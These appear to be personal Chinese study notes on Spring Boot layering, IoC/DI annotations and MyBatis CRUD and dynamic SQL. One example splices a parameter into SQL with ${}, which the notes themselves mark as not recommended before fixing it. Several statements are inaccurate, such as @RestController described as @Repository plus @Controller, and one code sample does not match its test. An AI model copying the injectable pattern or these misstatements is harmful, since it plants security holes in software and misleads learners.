响应字符串@RequestMapping(&quot;/str&quot;)public Result stringResponse() &#123;    //return new Result(0,&quot;success&quot;,&quot;Hello SpringBoot&quot;);    return Result.success(&quot;Hello SpringBoot&quot;);&#125;


响应对象响应格式为json
@RequestMapping(&quot;/obj&quot;)public Result objResponse() &#123;    Address address = new Address();    address.setProvince(&quot;福建&quot;);    address.setCity(&quot;泉州&quot;);    //return new Result(0,&quot;success&quot;,address);    return Result.success(address);&#125;


响应集合响应格式为json数组
@RequestMapping(&quot;/List&quot;)public Result listResponse() &#123;    Address address = new Address();    address.setProvince(&quot;福建&quot;);    address.setCity(&quot;泉州&quot;);    Address address2 = new Address();    address2.setProvince(&quot;福建&quot;);    address2.setCity(&quot;厦门&quot;);    List&lt;Address&gt; list = new ArrayList&lt;&gt;();    list.add(address2);    list.add(address);    //return new Result(0,&quot;success&quot;,list);    return Result.success(list);&#125;


案例
pom.xml中添加坐标&lt;dependency&gt;    &lt;groupId&gt;org.dom4j&lt;/groupId&gt;    &lt;artifactId&gt;dom4j&lt;/artifactId&gt;    &lt;version&gt;2.1.3&lt;/version&gt;&lt;/dependency&gt;

工具类XmlParserUtils
package com.example.demo.Utils;import org.dom4j.Document;import org.dom4j.DocumentException;import org.dom4j.Element;import org.dom4j.io.SAXReader;import java.io.File;import java.lang.reflect.Constructor;import java.util.ArrayList;import java.util.List;/** * XML解析工具类 * 提供将XML文件解析为Java对象列表的功能 */public class XmlParserUtils &#123;        /**         * 将XML文件解析为指定类型的对象列表         *         * @param file        XML文件路径         * @param targetClass 目标对象类型         * @param &lt;T&gt;         泛型类型         * @return 解析后的对象列表         * @throws DocumentException 如果XML解析失败         */        public static &lt;T&gt; List&lt;T&gt; parse(String file, Class&lt;T&gt; targetClass) throws DocumentException &#123;                // 1. 创建SAXReader对象用于读取XML                SAXReader reader = new SAXReader();                // 2. 读取XML文件并获取Document对象                Document document = reader.read(new File(file));                // 3. 获取XML根元素                Element rootElement = document.getRootElement();                // 4. 获取所有emp元素                List&lt;Element&gt; elements = rootElement.elements(&quot;emp&quot;);                // 5. 准备返回的结果列表                List&lt;T&gt; list = new ArrayList&lt;&gt;();                try &#123;                        // 6. 遍历集合,得到每一个emp标签                        for (Element element : elements) &#123;                                // 获取name属性                                String name = element.element(&quot;name&quot;).getText();                                // 获取age属性                                String age = element.element(&quot;age&quot;).getText();                                // 获取image属性                                String image = element.element(&quot;image&quot;).getText();                                // 获取gender属性                                String gender = element.element(&quot;gender&quot;).getText();                                // 获取job属性                                String job = element.element(&quot;job&quot;).getText();                                // 7. 获取目标类的构造方法                                Constructor&lt;T&gt; constructor = targetClass.getDeclaredConstructor(                                        String.class, Integer.class, String.class, String.class, String.class                                );                                // 8. 设置构造方法可访问（即使是私有构造方法）                                constructor.setAccessible(true);                                // 9. 使用反射创建对象实例                                T object = constructor.newInstance(                                        name,                                        Integer.parseInt(age),                                        image,                                        gender,                                        job                                );                                // 10. 将创建的对象添加到列表                                list.add(object);                        &#125;                &#125; catch (Exception e) &#123;                        throw new RuntimeException(&quot;XML解析为对象失败&quot;, e);                &#125;                return list;        &#125;&#125;

Emp类public class Emp &#123;        private String name;        private Integer age;        private String image;        private String gender;        private String job;        public Emp() &#123;        &#125;        public Emp(String name, Integer age, String image, String gender, String job) &#123;                this.name = name;                this.age = age;                this.image = image;                this.gender = gender;                this.job = job;        &#125;        public String getName() &#123;                return name;        &#125;        public void setName(String name) &#123;                this.name = name;        &#125;        public Integer getAge() &#123;                return age;        &#125;        public void setAge(Integer age) &#123;                this.age = age;        &#125;        public String getImage() &#123;                return image;        &#125;        public void setImage(String image) &#123;                this.image = image;        &#125;        public String getGender() &#123;                return gender;        &#125;        public void setGender(String gender) &#123;                this.gender = gender;        &#125;        public String getJob() &#123;                return job;        &#125;        public void setJob(String job) &#123;                this.job = job;        &#125;&#125;

处理请求类EmpController假设前端请求路径如下：

那么@RequestMapping中的路径就为”&#x2F;listEmp”
package com.example.demo.controller;import com.example.demo.POJO.Emp;import com.example.demo.POJO.Result;import com.example.demo.Utils.XmlParserUtils;import org.dom4j.DocumentException;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import java.util.List;@RestControllerpublic class EmpController &#123;        @RequestMapping(&quot;/listEmp&quot;)        public Result list() throws DocumentException &#123;                //1.加载并解析emp.xml                //动态加载xml文件                String file = this.getClass().getClassLoader().getResource(&quot;emp.xml&quot;).getFile();                List&lt;Emp&gt; empList = XmlParserUtils.parse(file, Emp.class);                //2.对数据进行转换处理                //流式处理                empList.stream().forEach(emp -&gt; &#123;                        String gender = emp.getGender();                        if (&quot;1&quot;.equals(gender)) &#123;                                emp.setGender(&quot;男&quot;);                        &#125; else if (&quot;2&quot;.equals(gender)) &#123;                                emp.setGender(&quot;女&quot;);                        &#125;                        String job = emp.getJob();                        if (&quot;1&quot;.equals(job)) &#123;                                emp.setJob(&quot;老师&quot;);                        &#125; else if (&quot;2&quot;.equals(job)) &#123;                                emp.setJob(&quot;主任&quot;);                        &#125;else if(&quot;3&quot;.equals(job))&#123;                                emp.setJob(&quot;就业指导&quot;);                        &#125;                &#125;);                //3.响应数据                return Result.success(empList);        &#125;&#125;

响应结果：

分层解耦三层架构


Dao层-数据访问Dao对数据的访问方式很多（文件,数据库等）,想要灵活处理需要使用接口

package com.example.demo.Dao;import com.example.demo.POJO.Emp;import java.util.List;public interface EmpDao &#123;        //获取员工列表        public List&lt;Emp&gt; getListEmp();&#125;

它的实现类A：

package com.example.demo.Dao.impl;import com.example.demo.Dao.EmpDao;import com.example.demo.POJO.Emp;import com.example.demo.Utils.XmlParserUtils;import org.dom4j.DocumentException;import java.util.List;public class EmpDaoA implements EmpDao &#123;        @Override        public List&lt;Emp&gt; getListEmp() throws DocumentException &#123;                //1.加载并解析emp.xml                //动态加载xml文件                String file = this.getClass().getClassLoader().getResource(&quot;emp.xml&quot;).getFile();                return XmlParserUtils.parse(file, Emp.class);        &#125;&#125;

Service层-业务逻辑处理与Dao层类似,想要灵活处理,使用接口

package com.example.demo.service;import com.example.demo.POJO.Emp;import java.util.List;public interface EmpService &#123;        //返回处理后的emp列表        public List&lt;Emp&gt; ListEmp();&#125;

它的实现类：
要处理数据,需要从Dao层获取,那么需要定义Dao对象
package com.example.demo.service.impl;import com.example.demo.Dao.EmpDao;import com.example.demo.Dao.impl.EmpDaoA;import com.example.demo.POJO.Emp;import com.example.demo.service.EmpService;import org.dom4j.DocumentException;import java.util.List;public class EmpServiceA implements EmpService &#123;        //面向接口编程        private EmpDao empDao = new EmpDaoA();        @Override        public List&lt;Emp&gt; ListEmp() throws DocumentException &#123;                List&lt;Emp&gt; empList = empDao.getListEmp();                empList.stream().forEach(emp -&gt; &#123;                        String gender = emp.getGender();                        if (&quot;1&quot;.equals(gender)) &#123;                                emp.setGender(&quot;男&quot;);                        &#125; else if (&quot;2&quot;.equals(gender)) &#123;                                emp.setGender(&quot;女&quot;);                        &#125;                        String job = emp.getJob();                        if (&quot;1&quot;.equals(job)) &#123;                                emp.setJob(&quot;老师&quot;);                        &#125; else if (&quot;2&quot;.equals(job)) &#123;                                emp.setJob(&quot;主任&quot;);                        &#125; else if (&quot;3&quot;.equals(job)) &#123;                                emp.setJob(&quot;就业指导&quot;);                        &#125;                &#125;);                                return empList;        &#125;&#125;

Controller层-接收请求,响应数据需要调底下1层的接口
package com.example.demo.controller;import com.example.demo.Dao.EmpDao;import com.example.demo.POJO.Emp;import com.example.demo.POJO.Result;import com.example.demo.Utils.XmlParserUtils;import com.example.demo.service.EmpService;import com.example.demo.service.impl.EmpServiceA;import org.dom4j.DocumentException;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import java.util.List;@RestControllerpublic class EmpController &#123;        private EmpService empService = new EmpServiceA();        @RequestMapping(&quot;/listEmp&quot;)        public Result list() throws DocumentException &#123;                //1.加载并解析emp.xml                //2.对数据进行转换处理                List&lt;Emp&gt; empList = empService.ListEmp();                //3.响应数据                return Result.success(empList);        &#125;&#125;


分层解耦
EmpController中的empService是Service层实现类的实例,说明这两层耦合
解决方法：容器
 

  
步骤
@Component注解在Dao层、Service实现类前加上该注解,表示将该类交给IOC容器管理,成为IOC容器中的bean
这样一来Controller层想要切换底层,直接更改@Component作用的类就行
@Componentpublic class EmpDaoA implements EmpDao &#123;        @Override        public List&lt;Emp&gt; getListEmp() throws DocumentException &#123;                //1.加载并解析emp.xml                //动态加载xml文件                String file = this.getClass().getClassLoader().getResource(&quot;emp.xml&quot;).getFile();                return XmlParserUtils.parse(file, Emp.class);        &#125;&#125;



@Autowired注解运行时,IOC容器会提供该类型的bean对象,并赋值给该变量 - 依赖注入
@RestControllerpublic class EmpController &#123;        @Autowired        private EmpService empService;        @RequestMapping(&quot;/listEmp&quot;)        public Result list() throws DocumentException &#123;                //1.加载并解析emp.xml                //2.对数据进行转换处理                List&lt;Emp&gt; empList = empService.ListEmp();                //3.响应数据                return Result.success(empList);        &#125;&#125;

IOC详解Bean的声明
Controller层不用再加@Controller,因为@RestController&#x3D;@Repository+@Controller

为什么称之为@Component的衍生类？


//可以以这样的形式为Bean对象起名字@Service(&quot;Name&quot;)

注意事项
Bean组件扫描
规范：将Dao放在启动类所在包
不规范：找不到包

就需要在启动类上使用@ComponentScan

源码显示,@ComponentScan需要接受String数组作为所在包
package com.example.demo;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.context.annotation.ComponentScan;@ComponentScan(&#123;&quot;Dao&quot;,&quot;com.example.demo&quot;&#125;)@SpringBootApplicationpublic class DemoApplication &#123;        public static void main(String[] args) &#123;                SpringApplication.run(DemoApplication.class, args);        &#125;&#125;

我们为什么数组中传入两个包呢？
@SpringBootApplication中集成的@ComponentScan扫描的是启动类所在的包；
在@ComponentScan中声明其他的包会覆盖掉启动类所在的包,所以需要重新声明启动类所在的包
DI详解如果有多个相同类型的Bean：




@Primary多个相同类型的Bean,加上@Primary的那个生效




@Qualifier在@AutoWired前加上@Qualifier(“Bean名字”)
package com.example.demo.controller;import com.example.demo.POJO.Emp;import com.example.demo.POJO.Result;import com.example.demo.service.EmpService;import org.dom4j.DocumentException;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.beans.factory.annotation.Qualifier;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import java.util.List;@RestControllerpublic class EmpController &#123;    	//EmpServiceA默认的bean名字        @Qualifier(&quot;empServiceA&quot;)        @Autowired        private EmpService empService;        @RequestMapping(&quot;/listEmp&quot;)        public Result list() throws DocumentException &#123;                //1.加载并解析emp.xml                //2.对数据进行转换处理                List&lt;Emp&gt; empList = empService.ListEmp();                //3.响应数据                return Result.success(empList);        &#125;&#125;

@Resource与@Qualifier的区别：

@Qualifier按照类型注入

@Resource按照名称注入;使用@Resource后就不用@Autowired了
  package com.example.demo.controller;import com.example.demo.POJO.Emp;import com.example.demo.POJO.Result;import com.example.demo.service.EmpService;import jakarta.annotation.Resource;import org.dom4j.DocumentException;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.beans.factory.annotation.Qualifier;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import java.util.List;@RestControllerpublic class EmpController &#123;//        @Qualifier(&quot;empServiceA&quot;)//        @Autowired        @Resource(name = &quot;empServiceB&quot;)        private EmpService empService;        @RequestMapping(&quot;/listEmp&quot;)        public Result list() throws DocumentException &#123;                //1.加载并解析emp.xml                //2.对数据进行转换处理                List&lt;Emp&gt; empList = empService.ListEmp();                //3.响应数据                return Result.success(empList);        &#125;&#125;


Mybatis
准备工作



springboot工程

配置文件spring.application.name=Mybatis-demospring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver#数据库名spring.datasource.url=jdbc:mysql://localhost:3306/mybatis#用户名spring.datasource.username=root#密码spring.datasource.password=114514

@Mapper注解Mybatis中Mapper层其实就和Dao层差不多
在运行时，会自动生成该接口的实现类对象（代理对象），并且将该对象交给IOC容器管理
package com.wwwtty.mybatisdemo.mapper;import com.wwwtty.mybatisdemo.pojo.User;import org.apache.ibatis.annotations.Mapper;import org.apache.ibatis.annotations.Select;import java.util.List;@Mapperpublic interface UserMapper &#123;        @Select(&quot;select* from user&quot;)        public List&lt;User&gt; list();&#125;

进行单元测试
package com.wwwtty.mybatisdemo;import com.wwwtty.mybatisdemo.mapper.UserMapper;import com.wwwtty.mybatisdemo.pojo.User;import org.junit.jupiter.api.Test;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;import java.util.List;@SpringBootTestclass MybatisDemoApplicationTests &#123;        @Autowired        UserMapper userMapper;        @Test        public void UserListTest()&#123;                List&lt;User&gt; list = userMapper.list();                list.stream().forEach(user -&gt;&#123;                        System.out.println(user);                &#125;);        &#125;&#125;

@SpringBootTest进行单元测试时，也会加载整个springboot环境

配置sql提示





功能强大qaq：

JDBC（面向接口编程）
JDBC只提供接口，由数据库厂商实现具体方法
 
缺点：


数据库连接池
 



实现了DataSource接口

切换连接池只需要引入maven依赖

&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;    &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt;    &lt;version&gt;1.2.8&lt;/version&gt;&lt;/dependency&gt;

本地测试还得在properties文件加上：
spring.datasource.type=com.alibaba.druid.pool.DruidDataSource

才能：

或者：
由于我的springboot版本为：

因此坐标中的druid-spring-boot-starter应该改成druid-spring-boot-3-starter
&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;    &lt;artifactId&gt;druid-spring-boot-3-starter&lt;/artifactId&gt;    &lt;version&gt;1.2.22&lt;/version&gt;&lt;/dependency&gt;


另一种配置方式

lombokpojo类再加上getter&#x2F;setter等方法之后，太过于臃肿


引入依赖&lt;dependency&gt;    &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;    &lt;artifactId&gt;lombok&lt;/artifactId&gt;&lt;/dependency&gt;

@Data包含了@Getter，@Setter，@ToString，@EqualsAndHashCode
不包含构造器
package com.wwwtty.mybatisdemo.pojo;import lombok.AllArgsConstructor;import lombok.Data;import lombok.Getter;import lombok.NoArgsConstructor;@Data@NoArgsConstructor@AllArgsConstructorpublic class User &#123;        private Integer id;        private String username;        private String password;        private String email;&#125;


上述注解的作用在于根据注解生成一系列方法
User的字节码文件反编译：


Mybatis基础操作删除操作@Deletepackage com.wwwtty.basic_op.Mapper;import org.apache.ibatis.annotations.Delete;import org.apache.ibatis.annotations.Mapper;@Mapperpublic interface EmpMapper &#123;        @Delete(&quot;delete from emp where id = 1&quot;)        void delete();&#125;

这么做的局限性是，id是静态的，但是前端传进来的id参数肯定是动态的
传递参数在@Delete中将参数用#&#123;&#125;包围

package com.wwwtty.basic_op.Mapper;import org.apache.ibatis.annotations.Delete;import org.apache.ibatis.annotations.Mapper;@Mapperpublic interface EmpMapper &#123;        @Delete(&quot;delete from emp where id = #&#123;id&#125;&quot;)        void delete(Integer id);&#125;

如何拿到影响的记录数呢，改一下返回值就可以
package com.wwwtty.basic_op.Mapper;import org.apache.ibatis.annotations.Delete;import org.apache.ibatis.annotations.Mapper;@Mapperpublic interface EmpMapper &#123;        @Delete(&quot;delete from emp where id = 1&quot;)        Integer delete();&#125;

@Testvoid contextLoads() &#123;    System.out.println(empMapper.delete(5));&#125;


测试表内容如下：

用@Autowired注入
package com.wwwtty.basic_op;import com.wwwtty.basic_op.Mapper.EmpMapper;import org.junit.jupiter.api.Test;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;@SpringBootTestclass BasicOpApplicationTests &#123;        @Autowired        private EmpMapper empMapper;        @Test        void contextLoads() &#123;                empMapper.delete(5);        &#125;&#125;


Mybatis日志输出#mybatis日志输出,输出到控制台mybatis.configuration.log-impl=org.apache.ibatis.logging.stdout.StdOutImpl

运行结果：
使用了参数化查询技术（预编译查询）
预编译SQL优势
参数占位符
新增操作@Insertinsert中的字段太多，可以直接封装成一个对象
用lombok封装getter&#x2F;setter等方法

package com.wwwtty.mybatis_insert.Mapper;import com.wwwtty.mybatis_insert.pojo.Emp;import org.apache.ibatis.annotations.Insert;import org.apache.ibatis.annotations.Mapper;@Mapperpublic interface EmpMapper &#123;        @Insert(&quot;insert into emp (id,name,email) values (#&#123;id&#125;,#&#123;name&#125;,#&#123;email&#125;)&quot;)        void Insert(Emp emp);&#125;

package com.wwwtty.mybatis_insert;import com.wwwtty.mybatis_insert.Mapper.EmpMapper;import com.wwwtty.mybatis_insert.pojo.Emp;import org.junit.jupiter.api.Test;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;@SpringBootTestclass MybatisInsertApplicationTests &#123;        @Autowired        EmpMapper empMapper;        @Test        void contextLoads() &#123;                Emp emp = new Emp();                emp.setId(5);                emp.setEmail(&quot;114514@acceed.com&quot;);                emp.setName(&quot;淳平&quot;);                empMapper.Insert(emp);        &#125;&#125;

日志输出：

主键返回
@Optionspackage com.wwwtty.mybatis_insert.Mapper;import com.wwwtty.mybatis_insert.pojo.Emp;import org.apache.ibatis.annotations.Insert;import org.apache.ibatis.annotations.Mapper;import org.apache.ibatis.annotations.Options;@Mapperpublic interface EmpMapper &#123;        /*        * keyProperty:主键值赋值给实体类哪个对象        * useGeneratedKeys:获取主键值        * */        @Options(keyProperty = &quot;id&quot;, useGeneratedKeys = true)        @Insert(&quot;insert into emp (name,email) values (#&#123;name&#125;,#&#123;email&#125;)&quot;)        void Insert(Emp emp);&#125;

这样一来getId()就不会返回null
package com.wwwtty.mybatis_insert;import com.wwwtty.mybatis_insert.Mapper.EmpMapper;import com.wwwtty.mybatis_insert.pojo.Emp;import org.junit.jupiter.api.Test;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;@SpringBootTestclass MybatisInsertApplicationTests &#123;        @Autowired        EmpMapper empMapper;        @Test        void contextLoads() &#123;                Emp emp = new Emp();//                emp.setId(5);                emp.setEmail(&quot;114514@acceed.com&quot;);                emp.setName(&quot;林丹&quot;);                empMapper.Insert(emp);                System.out.println(emp.getId());        &#125;&#125;


更新操作@Update
package com.wwwtty.mybatis_update.Mapper;import com.wwwtty.mybatis_update.pojo.Emp;import org.apache.ibatis.annotations.Mapper;import org.apache.ibatis.annotations.Update;@Mapperpublic interface EmpMapper &#123;        @Update(&quot;update emp set name=#&#123;name&#125;,email=#&#123;email&#125; where id=#&#123;id&#125;&quot;)        void update(Emp emp);&#125;

执行结果：


查询操作package com.wwwtty.mybatis_select.Mapper;import com.wwwtty.mybatis_select.pojo.Emp;import org.apache.ibatis.annotations.Mapper;import org.apache.ibatis.annotations.Select;import java.util.List;@Mapperpublic interface EmpMapper &#123;        @Select(&quot;select* from emp where id = #&#123;id&#125;&quot;)        List&lt;Emp&gt; getById(Integer id);&#125;

package com.wwwtty.mybatis_select;import com.wwwtty.mybatis_select.Mapper.EmpMapper;import com.wwwtty.mybatis_select.pojo.Emp;import org.junit.jupiter.api.Test;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;@SpringBootTestclass MybatisSelectApplicationTests &#123;        @Autowired        EmpMapper empMapper;        @Test        void contextLoads() &#123;                Emp emp = new Emp();                emp.setId(5);                System.out.println(empMapper.getById(5));        &#125;&#125;

运行结果：

数据封装

@Results，@Result/** column:字段名* property:类中属性名* */@Results(&#123;    @Result(column = &quot;&quot;,property = &quot;&quot;),    @Result(column = &quot;&quot;,property = &quot;&quot;)&#125;)

开启mybatis驼峰命名自动映射开关 a_column -&gt; aColumn#开启mybatis驼峰命名自动映射开关(直接搜索骆驼(camel))mybatis.configuration.map-underscore-to-camel-case=true

条件查询

select * from user where name like &#x27;%张%&#x27; and gender=1 and entrydate between &#x27;2010-01-01&#x27; and &#x27;2020-01-01&#x27; order by update_time desc

这些参数不好封装到一个对象中去，直接传参数
@Select(&quot;select * from user where name like &#x27;%$&#123;name&#125;%&#x27; and gender=#&#123;gender&#125; and &quot; +        &quot;entrydate between #&#123;begin&#125; and #&#123;end&#125; order by update_time desc&quot;)List&lt;User&gt; list(String name, Short gender, LocalDate begin,LocalDate end);

进行模糊匹配的时候，要用’%%’的形式，这样就不能用预编译的#{}(占位符不能出现在引号内)，需要用拼接sql的${}(不推荐)
@Test    void test() &#123;    List&lt;User&gt; res = empMapper.list(&quot;张&quot;, (short) 1, LocalDate.of(2010, 1, 1), LocalDate.of(2020, 1, 1));    res.stream().forEach(user -&gt; &#123;    	System.out.println(user);    &#125;);&#125;


怎么解决拼接的问题
concat()@Select(&quot;select * from user where name like concat(&#x27;%&#x27;,#&#123;name&#125;,&#x27;%&#x27;) and gender=#&#123;gender&#125; and &quot; +        &quot;entrydate between #&#123;begin&#125; and #&#123;end&#125; order by update_time desc&quot;)List&lt;User&gt; list(String name, Short gender, LocalDate begin,LocalDate end);


早期版本不会保留形参名

XML映射文件

与包名一致

与接口名一致

xml文件的约束：https://mybatis.p2hp.com/getting-started.html
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;https://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;!--mapper根标签--&gt;&lt;mapper namespace=&quot;com.wwwtty.xml_reflect.mapper.EmpMapper&quot;&gt;        &lt;!--    id:Mapper类中的方法名    --&gt;        &lt;!--   resultType:返回值所封装的单条记录的类型的全类名,比如返回值是List&lt;User&gt;,填的就是User的全类名     --&gt;        &lt;select id=&quot;list&quot; resultType=&quot;&quot;&gt;                        &lt;/select&gt;&lt;/mapper&gt;

获取全类名：

原查询语句：
@Select(&quot;select * from user where name like concat(&#x27;%&#x27;,#&#123;name&#125;,&#x27;%&#x27;) and gender=#&#123;gender&#125; and &quot; +        &quot;entrydate between #&#123;begin&#125; and #&#123;end&#125; order by update_time desc&quot;)List&lt;User&gt; list(String name, Short gender, LocalDate begin,LocalDate end);



改用xml映射的方式：
如果xml中sql语句没有高亮，上下文操作中选择注入语言
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;https://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;!--mapper根标签--&gt;&lt;mapper namespace=&quot;com.wwwtty.xml_reflect.mapper.EmpMapper&quot;&gt;        &lt;!--    id:Mapper类中的方法名    --&gt;        &lt;!--   resultType:返回值所封装的单条记录的类型的全类名,比如返回值是List&lt;User&gt;,填的就是User的全类名     --&gt;        &lt;select id=&quot;list&quot; resultType=&quot;com.wwwtty.xml_reflect.pojo.User&quot;&gt;                select * from user where name like concat(&#x27;%&#x27;,#&#123;name&#125;,&#x27;%&#x27;) and gender=#&#123;gender&#125; and                entrydate between #&#123;begin&#125; and #&#123;end&#125; order by update_time desc        &lt;/select&gt;&lt;/mapper&gt;

xml映射适合于复杂sql
动态sql
&lt; if &gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;https://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;!--mapper根标签--&gt;&lt;mapper namespace=&quot;com.wwwtty.xml_reflect.mapper.EmpMapper&quot;&gt;        &lt;!--    id:Mapper类中的方法名    --&gt;        &lt;!--   resultType:返回值所封装的单条记录的类型的全类名,比如返回值是List&lt;User&gt;,填的就是User的全类名     --&gt;        &lt;select id=&quot;list&quot; resultType=&quot;com.wwwtty.xml_reflect.pojo.User&quot;&gt;                select *                from user                where                &lt;if test=&quot;name != null&quot;&gt;                        name like concat(&#x27;%&#x27;, #&#123;name&#125;, &#x27;%&#x27;)                &lt;/if&gt;                &lt;if test=&quot;gender != null&quot;&gt;                        and gender = #&#123;gender&#125;                &lt;/if&gt;                &lt;if test=&quot;begin != null and end != null&quot;&gt;                        and entrydate between #&#123;begin&#125; and #&#123;end&#125;                &lt;/if&gt;                order by update_time desc        &lt;/select&gt;&lt;/mapper&gt;

empMapper.list(name,null,null,end);

相应的sql语句：

&lt; where &gt;在上面的例子中，如果我们只筛选性别：

但是这个and还很不好删除（容易别的地方出错）
作用：根据if的结果（子元素），自动添加&#x2F;删除where；同时自动删除多余的and和or
使用&lt; where &gt;解决
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;https://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;!--mapper根标签--&gt;&lt;mapper namespace=&quot;com.wwwtty.xml_reflect.mapper.EmpMapper&quot;&gt;        &lt;!--    id:Mapper类中的方法名    --&gt;        &lt;!--   resultType:返回值所封装的单条记录的类型的全类名,比如返回值是List&lt;User&gt;,填的就是User的全类名     --&gt;        &lt;select id=&quot;list&quot; resultType=&quot;com.wwwtty.xml_reflect.pojo.User&quot;&gt;                        select *                        from user                            &lt;where&gt;                                    &lt;if test=&quot;name != null&quot;&gt;                                            name like concat(&#x27;%&#x27;, #&#123;name&#125;, &#x27;%&#x27;)                                    &lt;/if&gt;                                    &lt;if test=&quot;gender != null&quot;&gt;                                            and gender = #&#123;gender&#125;                                    &lt;/if&gt;                                    &lt;if test=&quot;begin != null and end != null&quot;&gt;                                            and entrydate between #&#123;begin&#125; and #&#123;end&#125;                                    &lt;/if&gt;                                    order by update_time desc                            &lt;/where&gt;        &lt;/select&gt;&lt;/mapper&gt;

运行生成的sql：

&lt; set &gt;去除set中多余的逗号
案例:动态更新如果我们这样写动态更新的xml配置文件
&lt;update id=&quot;update&quot;&gt;    update user    set    &lt;if test=&quot;username != null&quot;&gt;        username=#&#123;username&#125;,    &lt;/if&gt;    &lt;if test=&quot;password != null&quot;&gt;        password=#&#123;password&#125;,    &lt;/if&gt;    &lt;if test=&quot;name != null&quot;&gt;        name=#&#123;name&#125;,    &lt;/if&gt;    &lt;if test=&quot;gender != null&quot;&gt;        gender=#&#123;gender&#125;,    &lt;/if&gt;    &lt;if test=&quot;image != null&quot;&gt;        image=#&#123;image&#125;,    &lt;/if&gt;    &lt;if test=&quot;job != null&quot;&gt;        job=#&#123;job&#125;,    &lt;/if&gt;    &lt;if test=&quot;entrydate != null&quot;&gt;        entrydate=#&#123;entrydate&#125;,    &lt;/if&gt;    &lt;if test=&quot;deptId != null&quot;&gt;        dept_id=#&#123;deptId&#125;,    &lt;/if&gt;    &lt;if test=&quot;createDate != null&quot;&gt;        create_time=#&#123;createTime&#125;,    &lt;/if&gt;    &lt;if test=&quot;updateTime != null&quot;&gt;        update_time=#&#123;updateTime&#125;    &lt;/if&gt;    where id = #&#123;id&#125;&lt;/update&gt;


会有多一个逗号的情况
使用 &lt; set &gt;解决
 
&lt; foreach &gt;场景：批量删除
delete from user where id in(3,4,5);

void deleteByIds(List&lt;Integer&gt; list);

&lt;delete id=&quot;deleteByIds&quot;&gt;    &lt;foreach collection=&quot;&quot; item=&quot;&quot; separator=&quot;&quot; open=&quot;&quot; close=&quot;&quot;&gt;    &lt;/foreach&gt;&lt;/delete&gt;


collection:要遍历的集合

item:遍历出的元素

separator:分隔符

open:遍历开始前拼接的sql片段

close:遍历结束后拼接的sql片段
  &lt;!--    delete from user where id in(3,4,5)    --&gt;&lt;delete id=&quot;deleteByIds&quot;&gt;    delete from user where id in    &lt;foreach collection=&quot;list&quot; item=&quot;id&quot; separator=&quot;,&quot; open=&quot;(&quot; close=&quot;)&quot;&gt;        #&#123;id&#125;    &lt;/foreach&gt;&lt;/delete&gt;

&lt; sql &gt;&lt; sql &gt;用于封装一些重复使用的sql片段，并分配一个唯一的id
&lt; include &gt;用&lt; include &gt;包含&lt; sql &gt;封装的sql片段，用refid&#x3D;id从而完成包含
void selectArgs();void selectById();



&lt;sql id=&quot;basicSelect&quot;&gt;    select username,    password,    name,    gender,    id,    username,    password,    name,    gender,    image,    job,    entrydate,    dept_id,    create_time,    update_time    from user&lt;/sql&gt;&lt;select id=&quot;selectArgs&quot;&gt;    &lt;include refid=&quot;basicSelect&quot; /&gt;&lt;/select&gt;&lt;select id=&quot;selectById&quot;&gt;    &lt;include refid=&quot;basicSelect&quot; /&gt;&lt;/select&gt;


案例
开发规范
Restful

统一响应结果
开发流程
部门管理部门管理-查询接口文档：

//使用该注解就不用自己new日志对象@Slf4j@RestControllerpublic class deptController &#123;        @RequestMapping(&quot;/dept&quot;)        public Result list()&#123;                log.info(&quot;查询所有部门信息&quot;);                return Result.Success();        &#125;&#125;

ps：构建项目时不要选lombok，否则要在pom.xml中注释以下内容：

否则报错：

postman测试：
日志输出：
指定请求方法@RequestMapping(value = &quot;/depts&quot;,method = RequestMethod.GET)//简化版本 @GetMapping(&quot;depts&quot;)

注入依赖Controller层
@Slf4j@RestControllerpublic class deptController &#123;        @Autowired        private deptService service;        @GetMapping(&quot;depts&quot;)        public Result list() &#123;                log.info(&quot;查询所有部门信息&quot;);                //查询所有部门信息                List&lt;Dept&gt; deptList = service.list();                return Result.success(deptList);        &#125;&#125;

Service层
@Servicepublic class deptImpl implements deptService &#123;        @Autowired        private deptMapper mapper;        @Override        public List&lt;Dept&gt; list() &#123;                return mapper.list();        &#125;&#125;

Mapper层
@Mapperpublic interface deptMapper &#123;        @Select(&quot;select * from dept&quot;)        public List&lt;Dept&gt; list();&#125;


部门管理-删除接口文档
流程
